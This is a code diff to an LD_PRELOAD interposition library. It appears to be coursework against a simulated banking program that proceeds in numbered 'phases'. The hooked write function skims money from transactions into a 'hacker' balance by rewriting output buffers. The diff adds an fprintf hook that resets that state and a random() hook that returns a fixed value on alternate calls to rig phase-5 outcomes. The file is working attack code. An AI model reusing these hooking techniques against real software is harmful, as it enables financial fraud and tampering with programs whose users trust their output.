@@ -49,6 +49,7 @@ char* phaseNum;
 
 
 int fscanf(FILE *stream, const char *format, ...) {
+
 	int rc;
 	va_list ap;
 	va_start(ap, format);
@@ -109,6 +110,10 @@ int open(const char *pathname, int flags, ...) {
 int phase4_skim = 0;
 int phase4_hacker_bal;
 int phase4_start = 1;
+
+
+int debugIndex = 0;
+
 ssize_t write(int fd, const void *buf, size_t count) {
 	static ssize_t (*origwrite)(int fd, const void *buf, size_t count) = NULL;
 	origwrite = (ssize_t (*)(int, const void*, size_t))dlsym(RTLD_NEXT, "write");
@@ -141,6 +146,7 @@ ssize_t write(int fd, const void *buf, size_t count) {
 			phase4_hacker_bal = atoi(hackerBuffer);
 			free(hackerBuffer);
 			phase4_start = 0;
+			close(hackerFd);
 		}
 		if(phase4_skim){
 			/* skim off transaction */
@@ -154,7 +160,7 @@ ssize_t write(int fd, const void *buf, size_t count) {
 			int acctBalStringLength = snprintf( NULL, 0, "%d", currBal );
 			char *temp_buffer = malloc(acctBalStringLength+1);
 			snprintf(temp_buffer, acctBalStringLength+1, "%d", currBal);
-			buf = memcpy(buf, temp_buffer, acctBalStringLength+1);
+			buf = (memcpy(buf, temp_buffer, acctBalStringLength+1));
 			free(temp_buffer);
 
 			// increment hacker balance by 4
@@ -172,15 +178,43 @@ ssize_t write(int fd, const void *buf, size_t count) {
 		}
 		phase4_skim = !phase4_skim;
 	}
-	else {
-		//phaseNum = "-1";
-		//phase4_skim = 0;
-		phase4_start = 1;
-	}
 
 	return origwrite(fd, buf, count);
 }
 
+
+int fprintf(FILE * restrict stream, const char * restrict format, ...){
+	int rc;
+	va_list ap;
+	va_start(ap, format);
+	if (strcmp(phaseNum, "4")==0) {
+		/* RESET PHASE 4 */
+		phase4_start = 1;
+		phase4_skim = 0;
+	  }
+	
+	rc = vfprintf(stream, format, ap);
+
+	va_end(ap);
+	return rc;
+}
+
+
+int phase5_isHacker = 0;
+long int random() {
+	static long int (*origRandom)() = NULL;
+	origRandom = (long int (*)())dlsym(RTLD_NEXT, "random");
+
+	if (strcmp(phaseNum, "5") == 0) {
+		if (phase5_isHacker) {
+			return 861794895;
+		}
+
+
+	phase5_isHacker = !phase5_isHacker;
+	}
+	return origRandom();
+}
 
 __attribute__((destructor))
 static void deallocate()
